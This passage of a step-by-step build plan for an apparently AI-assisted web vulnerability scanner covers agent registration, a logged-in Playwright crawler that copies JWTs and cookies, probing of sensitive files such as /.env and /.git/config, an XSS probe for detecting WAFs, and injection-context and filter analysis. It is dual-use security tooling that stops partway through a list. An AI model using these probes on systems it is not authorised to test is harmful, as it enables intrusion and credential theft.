### Task 2.1: Create new BaseAgent with deterministic-first pattern

**Files:**
- Modify: `agents/base.py`

- [ ] **Step 1: Add deterministic test interface to BaseAgent**

Add after the existing `_run_ollama_direct` method in `agents/base.py`:

```python
    # ── New deterministic-first interface ──────────────────
    # Used by DecisionEngine. Each vuln agent overrides _deterministic_test().

    def test_endpoint(self, endpoint, config, state) -> list:
        """
        DecisionEngine entry point. Runs deterministic test, optionally enhances with LLM.
        Returns list of finding dicts.
        """
        from engine.scan_state import Endpoint

        findings = []

        # Always: run deterministic test
        try:
            findings = self._deterministic_test(endpoint, config, state)
        except Exception as e:
            pass

        # Optional: LLM enhancement (if available and agent supports it)
        if config.llm_available and hasattr(self, '_llm_enhance_findings'):
            try:
                findings = self._llm_enhance_findings(findings, endpoint, config)
            except Exception:
                pass

        return findings

    def _deterministic_test(self, endpoint, config, state) -> list:
        """
        Override in subclass. Run deterministic validation against one endpoint.
        Returns list of finding dicts.
        Default: falls back to existing validate_finding via TOOL_DISPATCH.
        """
        from tools import TOOL_DISPATCH
        from validator import _reset_client

        vuln_type = getattr(self, "vuln_type", None)
        if not vuln_type:
            return []

        findings = []
        params_to_test = endpoint.params or [""]

        for param in params_to_test:
            try:
                _reset_client()
            except Exception:
                pass

            try:
                result = TOOL_DISPATCH["validate_finding"](
                    vuln_type=vuln_type,
                    url=endpoint.url,
                    param_name=param,
                    method=endpoint.method,
                    cookies=config.cookies or None,
                    extra_params=None,
                )
                if result.get("validated"):
                    result["severity"] = self._get_default_severity()
                    result["source"] = self.agent_name
                    result["vuln_type"] = result.get("type", vuln_type)
                    result["param_name"] = param
                    findings.append(result)
            except Exception:
                pass

        return findings

    def _get_default_severity(self) -> str:
        """Default severity by vuln type. Override in subclass if needed."""
        severity_map = {
            "sqli": "High", "xss": "Medium", "command_injection": "Critical",
            "path_traversal": "High", "csrf": "Medium", "idor": "High",
            "ssrf": "High", "open_redirect": "Low", "security_headers": "Low",
            "sensitive_data": "Medium",
        }
        vt = getattr(self, "vuln_type", "")
        return severity_map.get(vt, "Medium")
```

- [ ] **Step 2: Verify existing agents still work AND new interface works**

Run: `python3 -c "
from agents.vuln.sqli import SQLiAgent
from engine.scan_state import Endpoint
from engine.config import ScanConfig
agent = SQLiAgent(llm_backend='ollama')
# Test new interface
ep = Endpoint(url='https://httpbin.org/get', method='GET', params=['test'])
config = ScanConfig()
from engine.scan_state import ScanState
state = ScanState()
findings = agent.test_endpoint(ep, config, state)
print(f'SQLiAgent.test_endpoint returned {len(findings)} findings (expected 0 for httpbin)')
print('Migration interface works.')
"`

- [ ] **Step 3: Commit**

```bash
git add agents/base.py
git commit -m "feat: add deterministic-first test_endpoint() to BaseAgent for DecisionEngine"
```

---

### Task 2.2: Wire existing 13 agents into DecisionEngine

**Files:**
- Create: `engine/agent_registry.py`

- [ ] **Step 1: Write agent registry that connects existing agents to the engine**

```python
# engine/agent_registry.py
"""Registers all vulnerability agents with the DecisionEngine."""

from engine.decision_engine import DecisionEngine
from engine.config import ScanConfig


def register_all_agents(engine: DecisionEngine, config: ScanConfig):
    """Import and register all vuln agents with the decision engine."""
    agent_classes = {}

    # Existing agents
    try:
        from agents.vuln.sqli import SQLiAgent
        agent_classes["sqli"] = SQLiAgent
    except ImportError:
        pass
    try:
        from agents.vuln.xss import XSSAgent
        agent_classes["xss"] = XSSAgent
    except ImportError:
        pass
    try:
        from agents.vuln.cmdi import CMDIAgent
        agent_classes["cmdi"] = CMDIAgent
        agent_classes["command_injection"] = CMDIAgent
    except ImportError:
        pass
    try:
        from agents.vuln.path_traversal import PathTraversalAgent
        agent_classes["path_traversal"] = PathTraversalAgent
    except ImportError:
        pass
    try:
        from agents.vuln.csrf import CSRFAgent
        agent_classes["csrf"] = CSRFAgent
    except ImportError:
        pass
    try:
        from agents.vuln.idor import IDORAgent
        agent_classes["idor"] = IDORAgent
    except ImportError:
        pass
    try:
        from agents.vuln.ssrf import SSRFAgent
        agent_classes["ssrf"] = SSRFAgent
    except ImportError:
        pass
    try:
        from agents.vuln.open_redirect import OpenRedirectAgent
        agent_classes["open_redirect"] = OpenRedirectAgent
    except ImportError:
        pass
    try:
        from agents.vuln.headers import HeadersAgent
        agent_classes["security_headers"] = HeadersAgent
    except ImportError:
        pass
    try:
        from agents.vuln.sensitive_data import SensitiveDataAgent
        agent_classes["sensitive_data"] = SensitiveDataAgent
    except ImportError:
        pass
    try:
        from agents.vuln.graphql import GraphQLAgent
        agent_classes["graphql"] = GraphQLAgent
        agent_classes["graphql_introspection"] = GraphQLAgent
        agent_classes["graphql_depth"] = GraphQLAgent
        agent_classes["graphql_batch"] = GraphQLAgent
        agent_classes["graphql_injection"] = GraphQLAgent
    except ImportError:
        pass
    try:
        from agents.vuln.mass_assignment import MassAssignmentAgent
        agent_classes["mass_assignment"] = MassAssignmentAgent
    except ImportError:
        pass
    try:
        from agents.vuln.idor_advanced import IDORAdvancedAgent
        agent_classes["idor_advanced"] = IDORAdvancedAgent
        agent_classes["idor_mass_enum"] = IDORAdvancedAgent
        agent_classes["idor_write"] = IDORAdvancedAgent
        agent_classes["idor_delete"] = IDORAdvancedAgent
    except ImportError:
        pass

    # Instantiate and register
    instances = {}
    for vuln_type, cls in agent_classes.items():
        if cls not in instances:
            try:
                instances[cls] = cls(llm_backend=config.llm_backend)
            except Exception:
                continue
        agent = instances[cls]
        engine.register_agent(vuln_type, agent.test_endpoint)

    return list(instances.keys())
```

- [ ] **Step 2: Verify all agents register**

Run: `python3 -c "
from engine.decision_engine import DecisionEngine
from engine.scan_state import ScanState
from engine.config import ScanConfig
from engine.agent_registry import register_all_agents

config = ScanConfig(llm_backend='ollama')
state = ScanState()
engine = DecisionEngine(config, state)
registered = register_all_agents(engine, config)
print(f'Registered {len(engine._agent_dispatch)} agent handlers')
print('Agent types:', sorted(engine._agent_dispatch.keys()))
"`

- [ ] **Step 3: Commit**

```bash
git add engine/agent_registry.py
git commit -m "feat: add agent registry — wires all 13 existing agents into DecisionEngine"
```

---

## Phase 3: Discovery Engine

### Task 3.1: Create discovery/playwright_crawler.py

**Files:**
- Create: `discovery/__init__.py`
- Create: `discovery/playwright_crawler.py`

- [ ] **Step 1: Write the authenticated Playwright crawler + traffic recorder**

```python
# discovery/__init__.py
"""Discovery engine — browser-based crawling, API inference, passive recon."""

# discovery/playwright_crawler.py
"""
Authenticated Playwright crawler — the primary discovery method.

Replaces HTML crawling with real browser automation:
- Logs in via OAuth/credentials
- Navigates all routes, clicks interactive elements
- Records all XHR/fetch API calls
- Extracts SPA router routes from JavaScript
- Returns discovered endpoints as Endpoint objects
"""

import re
import json
import time
from urllib.parse import urlparse, urljoin
from typing import Optional
from rich.console import Console
from engine.scan_state import ScanState, Endpoint
from engine.config import ScanConfig

console = Console()

# Domains to skip (analytics, tracking, CDN)
SKIP_DOMAINS = re.compile(
    r'(google-analytics|googletagmanager|facebook|doubleclick|'
    r'hotjar|segment|mixpanel|amplitude|sentry|bugsnag|'
    r'newrelic|nr-data|pendo|intercom|drift|hubspot|'
    r'cloudflare|cdn\.)', re.I
)

STATIC_EXTENSIONS = re.compile(
    r'\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map)(\?|$)', re.I
)


def discover_with_playwright(
    target: str,
    config: ScanConfig,
    state: ScanState,
    username: str = "",
    password: str = "",
    client_id: str = "",
    login_steps: Optional[list] = None,
):
    """
    Primary discovery function. Crawls the target with a real browser,
    records all API traffic, and populates state.endpoints.

    Args:
        target: base URL to scan
        config: scan configuration
        state: shared scan state (endpoints will be written here)
        username/password/client_id: optional auth credentials
        login_steps: optional list of custom Playwright login steps
    """
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        console.print("  [yellow]Playwright not installed — falling back to HTTP crawl[/]")
        _fallback_http_crawl(target, config, state)
        return

    recorded_calls = []
    visited_urls = set()
    discovered_links = set()

    def on_request(req):
        """Intercept all XHR/fetch requests."""
        if req.resource_type not in ("xhr", "fetch"):
            return
        if SKIP_DOMAINS.search(req.url):
            return
        if STATIC_EXTENSIONS.search(req.url):
            return

        body = ""
        try:
            pd = req.post_data
            if pd:
                body = pd[:2000]
        except Exception:
            pass

        recorded_calls.append({
            "url": req.url,
            "method": req.method,
            "headers": dict(req.headers),
            "body": body,
        })

    console.print(f"  [bold]Playwright crawler starting: {target}[/]")

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context(ignore_https_errors=True)
        page = ctx.new_page()
        page.on("request", on_request)

        # Step 1: Navigate to target
        try:
            page.goto(target, timeout=30000)
            page.wait_for_load_state("networkidle", timeout=15000)
        except Exception as e:
            console.print(f"  [yellow]Initial load failed: {e}[/]")

        visited_urls.add(target)
        console.print(f"  Page loaded: {page.title()}")

        # Step 2: Login if credentials provided
        if username and password:
            _attempt_login(page, ctx, target, username, password, client_id, config)
            time.sleep(2)
            page.wait_for_load_state("networkidle", timeout=15000)
            console.print(f"  After login: {page.url[:80]}")

        # Step 3: Discover navigation links
        try:
            links = page.evaluate("""() => {
                const links = new Set();
                document.querySelectorAll('a[href]').forEach(a => {
                    if (a.href && !a.href.startsWith('javascript:')) links.add(a.href);
                });
                // SPA nav elements
                document.querySelectorAll('[data-href],[data-link],[routerlink]').forEach(el => {
                    const href = el.getAttribute('data-href') || el.getAttribute('data-link') || el.getAttribute('routerlink');
                    if (href) links.add(href);
                });
                return Array.from(links);
            }""")
            for link in links:
                if _is_same_origin(link, target):
                    discovered_links.add(link)
        except Exception:
            pass

        # Step 4: Click navigation elements (tabs, buttons, menu items)
        try:
            nav_elements = page.locator(
                'nav a, [role="tab"], [role="menuitem"], '
                '.nav-link, .tab, .menu-item, '
                'button[data-testid*="nav"], a[data-testid*="nav"]'
            ).all()

            for el in nav_elements[:20]:  # limit to 20 nav items
                try:
                    el.click(timeout=3000)
                    time.sleep(1)
                    page.wait_for_load_state("networkidle", timeout=5000)
                    visited_urls.add(page.url)
                except Exception:
                    pass
        except Exception:
            pass

        # Step 5: Navigate discovered links
        for link in list(discovered_links)[:30]:  # limit
            if link in visited_urls:
                continue
            try:
                page.goto(link, timeout=15000)
                page.wait_for_load_state("networkidle", timeout=10000)
                visited_urls.add(link)
                time.sleep(1)
            except Exception:
                pass

        # Step 6: Scroll pages to trigger lazy loading
        for _ in range(3):
            try:
                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                time.sleep(1)
            except Exception:
                break

        # Step 7: Extract SPA routes from JS
        try:
            spa_routes = page.evaluate("""() => {
                const routes = new Set();
                // React Router
                if (window.__REACT_ROUTER_HISTORY__) {
                    // Attempt to read route config
                }
                // Check hash-based routes
                const links = document.querySelectorAll('a[href*="#/"]');
                links.forEach(a => routes.add(a.href));
                return Array.from(routes);
            }""")
            for r in spa_routes:
                if _is_same_origin(r, target):
                    discovered_links.add(r)
        except Exception:
            pass

        # Step 8: Extract tokens from localStorage/cookies
        try:
            ls_keys = page.evaluate("Object.keys(localStorage)")
            for k in ls_keys:
                if any(kw in k.lower() for kw in ["auth", "token", "session", "jwt"]):
                    val = page.evaluate(f'localStorage.getItem("{k}")')
                    if val:
                        try:
                            parsed = json.loads(val)
                            token = None
                            if isinstance(parsed, dict):
                                token = (parsed.get("body", {}).get("access_token")
                                         or parsed.get("access_token")
                                         or parsed.get("id_token"))
                            if token and not config.bearer_token:
                                config.bearer_token = token
                                state.auth_info["type"] = "jwt"
                                state.auth_info["source"] = f"localStorage:{k}"
                                console.print(f"  [green]Extracted JWT from localStorage[/]")
                        except Exception:
                            pass
        except Exception:
            pass

        # Collect cookies
        cookies = {c["name"]: c["value"] for c in ctx.cookies()}
        if cookies:
            config.cookies = cookies
            state.auth_info["cookies"] = list(cookies.keys())

        browser.close()

    # Step 9: Convert recorded API calls to Endpoint objects
    console.print(f"  Recorded {len(recorded_calls)} API calls from {len(visited_urls)} pages")

    seen = set()
    for call in recorded_calls:
        url_base = call["url"].split("?")[0]
        method = call["method"]
        key = (url_base, method)
        if key in seen:
            continue
        seen.add(key)

        # Extract query params
        parsed = urlparse(call["url"])
        params = []
        if parsed.query:
            for qp in parsed.query.split("&"):
                if "=" in qp:
                    params.append(qp.split("=")[0])

        # Extract JSON body fields
        body_fields = []
        if call["body"]:
            try:
                body_json = json.loads(call["body"])
                if isinstance(body_json, dict):
                    body_fields = list(body_json.keys())[:20]
            except Exception:
                pass

        # Detect content type
        ct = call.get("headers", {}).get("content-type", "")

        ep = Endpoint(
            url=url_base,
            method=method,
            params=params,
            body_fields=body_fields,
            content_type=ct,
            auth_required=bool(call.get("headers", {}).get("authorization")),
        )
        state.add_endpoint(ep)

    # Step 10: Detect tech stack from recorded responses
    _detect_tech_stack(state, recorded_calls)

    console.print(
        f"  [green]Discovery complete: {len(state.endpoints)} unique endpoints[/]"
    )


def _attempt_login(page, ctx, target, username, password, client_id, config):
    """Attempt to log in — handles common auth flows."""
    # Generic login: look for username/password fields
    try:
        # Check for client ID field first (multi-tenant apps)
        client_input = page.locator('input[placeholder*="Client"],input[name*="client"]').first
        if client_input.count() > 0 and client_id:
            client_input.fill(client_id)
            page.keyboard.press("Enter")
            time.sleep(2)

        # Look for login/continue button
        for btn_text in ["LOGIN", "CONTINUE", "SIGN IN", "LOG IN"]:
            try:
                btn = page.get_by_role("button", name=btn_text, exact=False).first
                if btn.count() > 0:
                    btn.click(timeout=3000)
                    time.sleep(2)
                    break
            except Exception:
                pass

        page.wait_for_load_state("networkidle", timeout=10000)

        # Fill username
        un_field = page.locator(
            'input[name="username"],input[name="email"],input[type="email"],'
            'input[placeholder*="user"],input[placeholder*="User"],input[placeholder*="email"]'
        ).first
        if un_field.count() > 0:
            un_field.fill(username)
            # Click continue/next
            for btn_text in ["CONTINUE", "NEXT", "LOGIN", "SIGN IN"]:
                try:
                    page.get_by_role("button", name=btn_text, exact=False).first.click(timeout=2000)
                    time.sleep(2)
                    break
                except Exception:
                    pass

        # Fill password
        pw_field = page.locator('input[type="password"]').first
        if pw_field.count() > 0:
            pw_field.fill(password)
            for btn_text in ["LOGIN", "LOG IN", "SIGN IN", "CONTINUE", "SUBMIT"]:
                try:
                    page.get_by_role("button", name=btn_text, exact=False).first.click(timeout=2000)
                    time.sleep(3)
                    break
                except Exception:
                    pass

    except Exception as e:
        console.print(f"  [yellow]Login attempt failed: {e}[/]")


def _detect_tech_stack(state, recorded_calls):
    """Detect technology stack from response headers and URLs."""
    for call in recorded_calls:
        headers = call.get("headers", {})
        url = call.get("url", "")

        # Server headers
        for h in ["x-powered-by", "server"]:
            val = headers.get(h, "")
            if val:
                state.tech_stack[h] = val

        # Framework detection from URLs/headers
        if "graphql" in url.lower():
            state.tech_stack["api"] = "GraphQL"
        if headers.get("x-request-id"):
            state.tech_stack["tracing"] = True


def _is_same_origin(url: str, target: str) -> bool:
    """Check if a URL belongs to the same origin as the target."""
    try:
        t = urlparse(target)
        u = urlparse(url)
        return u.netloc == t.netloc or u.netloc.endswith("." + t.netloc.split(".")[-2] + "." + t.netloc.split(".")[-1])
    except Exception:
        return False


def _fallback_http_crawl(target, config, state):
    """Simple HTTP-based crawl when Playwright is not available."""
    import httpx

    try:
        headers = config.get_auth_headers()
        client = httpx.Client(timeout=15, verify=False, follow_redirects=True)
        resp = client.get(target, headers=headers)

        # Extract links
        from re import findall
        urls = findall(r'href=["\']([^"\']+)["\']', resp.text)
        for u in urls:
            full_url = urljoin(target, u)
            if _is_same_origin(full_url, target):
                state.add_endpoint(Endpoint(url=full_url, method="GET"))

        client.close()
    except Exception as e:
        console.print(f"  [yellow]HTTP fallback crawl failed: {e}[/]")
```

- [ ] **Step 2: Verify import and basic structure**

Run: `python3 -c "from discovery.playwright_crawler import discover_with_playwright; print('Import OK')"`

- [ ] **Step 3: Commit**

```bash
git add discovery/
git commit -m "feat: add Playwright crawler — browser-based discovery with traffic recording"
```

---

### Task 3.2: Create discovery/passive_recon.py

**Files:**
- Create: `discovery/passive_recon.py`

- [ ] **Step 1: Write passive reconnaissance module**

```python
# discovery/passive_recon.py
"""
Passive reconnaissance — collect intelligence without active testing.

Checks: response headers, cookies, JWT structure, tech fingerprinting,
robots.txt, sitemap.xml, common admin/backup paths.
"""

import re
import json
import base64
import httpx
from urllib.parse import urljoin
from rich.console import Console
from engine.scan_state import ScanState, Endpoint
from engine.config import ScanConfig

console = Console()

# Common paths to probe (directory brute force - lite)
COMMON_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD",
    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
    "/admin", "/admin/", "/administrator",
    "/api", "/api/", "/api/v1", "/api/v2", "/api/docs",
    "/swagger.json", "/swagger/", "/api-docs",
    "/openapi.json", "/openapi.yaml",
    "/graphql", "/graphiql", "/_graphql",
    "/debug", "/debug/", "/phpinfo.php",
    "/server-status", "/server-info",
    "/wp-admin", "/wp-login.php",
    "/backup", "/backup.sql", "/db.sql", "/dump.sql",
    "/.DS_Store", "/web.config", "/crossdomain.xml",
    "/elmah.axd", "/trace.axd",
    "/actuator", "/actuator/health", "/actuator/env",
    "/metrics", "/prometheus",
    "/console", "/h2-console",
]

SECURITY_HEADERS = [
    "x-frame-options",
    "x-content-type-options",
    "strict-transport-security",
    "content-security-policy",
    "referrer-policy",
    "permissions-policy",
    "x-xss-protection",
]

INFO_LEAK_HEADERS = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]


def run_passive_recon(target: str, config: ScanConfig, state: ScanState):
    """
    Run all passive intelligence gathering against the target.
    Writes tech_stack, auth_info, waf_info, and findings to state.
    """
    console.print("  [bold]Passive reconnaissance[/]")

    headers = config.get_auth_headers()
    headers["User-Agent"] = "Mozilla/5.0 (compatible; PentestAgent/1.0)"

    client = httpx.Client(timeout=10, verify=False, follow_redirects=True, headers=headers)

    # 1. Analyze main page response
    try:
        resp = client.get(target)
        _analyze_headers(resp, target, state)
        _analyze_cookies(resp, target, state)
        console.print(f"    Headers + cookies analyzed")
    except Exception as e:
        console.print(f"    [yellow]Main page request failed: {e}[/]")

    # 2. JWT analysis
    if config.bearer_token:
        _analyze_jwt(config.bearer_token, state)
        console.print(f"    JWT analyzed")

    # 3. Directory probing
    found_paths = _probe_common_paths(target, client, state)
    console.print(f"    Probed {len(COMMON_PATHS)} paths, found {found_paths} accessible")

    # 4. WAF detection
    _detect_waf(target, client, state)
    if state.waf_info.get("detected"):
        console.print(f"    WAF detected: {state.waf_info['detected']}")

    client.close()

    console.print(f"  [green]Passive recon complete[/]")


def _analyze_headers(resp, url: str, state: ScanState):
    """Check for missing security headers and info-leak headers."""
    resp_headers = {k.lower(): v for k, v in resp.headers.items()}

    missing = []
    for h in SECURITY_HEADERS:
        if h not in resp_headers:
            missing.append(h)

    if missing:
        state.add_finding({
            "vuln_type": "Missing Security Headers",
            "url": url,
            "method": "GET",
            "param_name": "",
            "payload": "N/A (passive check)",
            "evidence": f"Missing: {', '.join(missing)}",
            "severity": "Low",
            "source": "passive-recon",
            "validated": True,
        })

    # Info leak headers
    for h in INFO_LEAK_HEADERS:
        if h in resp_headers:
            state.tech_stack[h] = resp_headers[h]

    # CSP analysis
    csp = resp_headers.get("content-security-policy", "")
    if csp:
        state.tech_stack["csp"] = csp
        if "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
            state.add_finding({
                "vuln_type": "Weak CSP Policy",
                "url": url,
                "method": "GET",
                "param_name": "",
                "payload": "N/A (passive check)",
                "evidence": f"CSP contains unsafe directives: {csp[:200]}",
                "severity": "Low",
                "source": "passive-recon",
                "validated": True,
            })

    # CORS check
    cors = resp_headers.get("access-control-allow-origin", "")
    if cors == "*":
        creds = resp_headers.get("access-control-allow-credentials", "")
        state.add_finding({
            "vuln_type": "CORS Misconfiguration",
            "url": url,
            "method": "GET",
            "param_name": "",
            "payload": "N/A (passive check)",
            "evidence": f"Access-Control-Allow-Origin: * (credentials: {creds or 'not set'})",
            "severity": "Medium" if creds.lower() == "true" else "Low",
            "source": "passive-recon",
            "validated": True,
        })


def _analyze_cookies(resp, url: str, state: ScanState):
    """Check cookie security attributes."""
    issues = []
    for cookie_header in resp.headers.get_list("set-cookie"):
        parts = cookie_header.split(";")
        name = parts[0].split("=")[0].strip() if parts else "unknown"
        flags = cookie_header.lower()

        if "httponly" not in flags:
            issues.append(f"{name}: missing HttpOnly")
        if "secure" not in flags and url.startswith("https"):
            issues.append(f"{name}: missing Secure")
        if "samesite" not in flags:
            issues.append(f"{name}: missing SameSite")

    if issues:
        state.add_finding({
            "vuln_type": "Insecure Cookie Configuration",
            "url": url,
            "method": "GET",
            "param_name": "",
            "payload": "N/A (passive check)",
            "evidence": "; ".join(issues[:5]),
            "severity": "Low",
            "source": "passive-recon",
            "validated": True,
        })


def _analyze_jwt(token: str, state: ScanState):
    """Decode and analyze JWT structure."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return

        # Decode header
        header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        state.auth_info["jwt_algorithm"] = header.get("alg", "unknown")
        state.auth_info["jwt_type"] = header.get("typ", "JWT")

        # Decode payload
        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        state.auth_info["jwt_claims"] = list(payload.keys())

        # Check for weak algorithm
        alg = header.get("alg", "").upper()
        if alg == "NONE" or alg == "HS256":
            state.add_finding({
                "vuln_type": "Weak JWT Configuration",
                "url": "JWT Token",
                "method": "N/A",
                "param_name": "",
                "payload": f"Algorithm: {alg}",
                "evidence": f"JWT uses {alg} algorithm. Header: {json.dumps(header)}",
                "severity": "High" if alg == "NONE" else "Medium",
                "source": "passive-recon",
                "validated": True,
            })

    except Exception:
        pass


def _probe_common_paths(target: str, client: httpx.Client, state: ScanState) -> int:
    """Probe common paths for sensitive files/endpoints."""
    found = 0
    for path in COMMON_PATHS:
        url = urljoin(target, path)
        try:
            resp = client.get(url, follow_redirects=False)
            if resp.status_code in (200, 301, 302, 403):
                found += 1
                state.add_endpoint(Endpoint(
                    url=url,
                    method="GET",
                    response_status=resp.status_code,
                    response_headers=dict(resp.headers),
                ))

                # Sensitive files that shouldn't be accessible
                if resp.status_code == 200 and path in ("/.env", "/.git/config", "/.git/HEAD",
                                                         "/backup.sql", "/db.sql", "/dump.sql",
                                                         "/phpinfo.php", "/.DS_Store"):
                    state.add_finding({
                        "vuln_type": "Sensitive File Exposure",
                        "url": url,
                        "method": "GET",
                        "param_name": "",
                        "payload": "N/A (passive check)",
                        "evidence": f"{path} is publicly accessible (HTTP {resp.status_code}). "
                                    f"Response size: {len(resp.content)} bytes",
                        "severity": "High",
                        "source": "passive-recon",
                        "validated": True,
                    })
        except Exception:
            pass

    return found


def _detect_waf(target: str, client: httpx.Client, state: ScanState):
    """Detect WAF by sending a suspicious request and analyzing the response."""
    test_url = f"{target}/?test=<script>alert(1)</script>"
    try:
        resp = client.get(test_url)
        headers = {k.lower(): v for k, v in resp.headers.items()}

        # Cloudflare
        if "cf-ray" in headers or "cloudflare" in headers.get("server", "").lower():
            state.waf_info["detected"] = "cloudflare"
        # AWS WAF
        elif "x-amzn-requestid" in headers and resp.status_code == 403:
            state.waf_info["detected"] = "aws_waf"
        # ModSecurity
        elif "mod_security" in resp.text.lower() or "modsecurity" in resp.text.lower():
            state.waf_info["detected"] = "modsecurity"
        # Akamai
        elif "akamai" in headers.get("server", "").lower():
            state.waf_info["detected"] = "akamai"
        # Generic 403 with WAF-like response
        elif resp.status_code == 403 and len(resp.content) < 1000:
            state.waf_info["detected"] = "unknown_waf"
            state.waf_info["evidence"] = f"403 on XSS probe, body size: {len(resp.content)}"

    except Exception:
        pass
```

- [ ] **Step 2: Verify**

Run: `python3 -c "from discovery.passive_recon import run_passive_recon; print('Import OK')"`

- [ ] **Step 3: Commit**

```bash
git add discovery/passive_recon.py
git commit -m "feat: add passive recon — headers, cookies, JWT, dirbusting, WAF detection"
```

---

## Phase 4: Exploit Foundations

### Task 4.1: Create exploit/context_analyzer.py

**Files:**
- Create: `exploit/__init__.py`
- Create: `exploit/context_analyzer.py`

- [ ] **Step 1: Write context analyzer — canary injection + reflection detection**

```python
# exploit/__init__.py
"""Exploitation engine — context analysis, filter detection, payload library."""

# exploit/context_analyzer.py
"""
Context analyzer — determines WHERE user input lands in the response.

Sends a unique canary string, then analyzes where it appears:
- HTML body (between tags)
- HTML attribute (inside quotes)
- JavaScript string context
- JSON value
- HTTP header
- Not reflected at all

This determines which payload category to use.
"""

import re
import uuid
import httpx
from dataclasses import dataclass
from engine.config import ScanConfig

CONTEXTS = {
    "html_body": "Input appears between HTML tags — XSS via tag injection",
    "html_attribute_double": "Input inside double-quoted HTML attribute",
    "html_attribute_single": "Input inside single-quoted HTML attribute",
    "html_attribute_unquoted": "Input in unquoted HTML attribute",
    "javascript_string_double": "Input inside JS double-quoted string",
    "javascript_string_single": "Input inside JS single-quoted string",
    "javascript_template": "Input inside JS template literal",
    "json_value": "Input inside JSON value",
    "url_param": "Input reflected in URL/redirect",
    "http_header": "Input reflected in HTTP response header",
    "not_reflected": "Input not found in response",
}


@dataclass
class ReflectionResult:
    """Result of canary reflection analysis."""
    reflected: bool
    contexts: list           # list of context type strings
    raw_positions: list      # list of (start_idx, surrounding_chars) tuples
    canary: str
    response_status: int
    response_length: int


def analyze_reflection(
    url: str,
    param: str,
    method: str = "GET",
    config: ScanConfig = None,
) -> ReflectionResult:
    """
    Send a canary string in the parameter and analyze where it reflects.

    Returns ReflectionResult with detected injection contexts.
    """
    canary = f"xPENx{uuid.uuid4().hex[:8]}xTESTx"
    config = config or ScanConfig()

    headers = config.get_auth_headers()
    headers["User-Agent"] = "Mozilla/5.0 (compatible; PentestAgent/1.0)"

    client = httpx.Client(timeout=10, verify=False, follow_redirects=True)

    try:
        if method.upper() == "GET":
            resp = client.get(url, params={param: canary}, headers=headers)
        else:
            resp = client.post(url, data={param: canary}, headers=headers)
    except Exception:
        return ReflectionResult(
            reflected=False, contexts=["not_reflected"], raw_positions=[],
            canary=canary, response_status=0, response_length=0,
        )
    finally:
        client.close()

    body = resp.text
    resp_headers_str = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())

    if canary not in body and canary not in resp_headers_str:
        return ReflectionResult(
            reflected=False, contexts=["not_reflected"], raw_positions=[],
            canary=canary, response_status=resp.status_code, response_length=len(body),
        )

    # Find all occurrences and analyze surrounding context
    contexts = set()
    positions = []

    for match in re.finditer(re.escape(canary), body):
        start = max(0, match.start() - 50)
        end = min(len(body), match.end() + 50)
        surrounding = body[start:end]
        positions.append((match.start(), surrounding))

        ctx = _classify_context(body, match.start(), match.end())
        contexts.add(ctx)

    # Check response headers
    if canary in resp_headers_str:
        contexts.add("http_header")

    return ReflectionResult(
        reflected=True,
        contexts=sorted(contexts),
        raw_positions=positions,
        canary=canary,
        response_status=resp.status_code,
        response_length=len(body),
    )


def _classify_context(body: str, start: int, end: int) -> str:
    """Classify the injection context based on surrounding characters."""
    # Look backwards from canary position
    before = body[max(0, start - 200):start]
    after = body[end:min(len(body), end + 200)]

    # Check if inside <script> block
    last_script_open = before.rfind("<script")
    last_script_close = before.rfind("</script")
    if last_script_open > last_script_close:
        # Inside script block — check string context
        # Count unescaped quotes before canary
        before_in_script = before[last_script_open:]
        dq = before_in_script.count('"') - before_in_script.count('\\"')
        sq = before_in_script.count("'") - before_in_script.count("\\'")
        bt = before_in_script.count("`")

        if bt % 2 == 1:
            return "javascript_template"
        elif dq % 2 == 1:
            return "javascript_string_double"
        elif sq % 2 == 1:
            return "javascript_string_single"
        return "html_body"  # in script but not in a string

    # Check if inside HTML attribute
    last_tag_open = before.rfind("<")
    last_tag_close = before.rfind(">")
    if last_tag_open > last_tag_close:
        # Inside a tag — likely an attribute
        tag_content = before[last_tag_open:]
        if '="' in tag_content and tag_content.count('"') % 2 == 1:
            return "html_attribute_double"
        elif "='" in tag_content and tag_content.count("'") % 2 == 1:
            return "html_attribute_single"
        elif "=" in tag_content:
            return "html_attribute_unquoted"

    # Check JSON context
    try:
        # Simple heuristic: surrounded by quotes and colons
        if (before.rstrip().endswith('"') or before.rstrip().endswith("'")) and \
           (":" in before[-20:] or "," in before[-10:]):
            return "json_value"
    except Exception:
        pass

    # Check URL/redirect context
    if re.search(r'(href|src|action|url|redirect|location)\s*=\s*["\']?[^"\']*$', before, re.I):
        return "url_param"

    return "html_body"
```

- [ ] **Step 2: Verify**

Run: `python3 -c "
from exploit.context_analyzer import analyze_reflection, CONTEXTS
print(f'{len(CONTEXTS)} context types defined')
# Test against httpbin which reflects params
result = analyze_reflection('https://httpbin.org/get', 'test', 'GET')
print(f'Reflected: {result.reflected}, Contexts: {result.contexts}, Status: {result.response_status}')
print('Context analyzer OK')
"`

- [ ] **Step 3: Commit**

```bash
git add exploit/
git commit -m "feat: add context analyzer — canary injection + reflection context detection"
```

---

### Task 4.2: Create exploit/filter_detector.py

**Files:**
- Create: `exploit/filter_detector.py`

- [ ] **Step 1: Write filter detector — per-parameter character analysis**

```python
# exploit/filter_detector.py
"""
Filter detector — probes which characters are blocked, stripped, or encoded
for each parameter. Builds a filter profile that guides payload selection.
"""

import httpx
import uuid
from dataclasses import dataclass, field
from engine.config import ScanConfig


# Characters to test, ordered by importance for security testing
TEST_CHARS = [
    ("single_quote", "'"),
    ("double_quote", '"'),
    ("less_than", "<"),
    ("greater_than", ">"),
    ("semicolon", ";"),
    ("pipe", "|"),
    ("ampersand", "&"),
    ("backtick", "`"),
    ("dollar_paren", "$("),
    ("backslash", "\\"),
    ("forward_slash", "/"),
    ("double_dot", ".."),
    ("percent", "%"),
    ("open_brace", "{"),
    ("close_brace", "}"),
    ("open_bracket", "["),
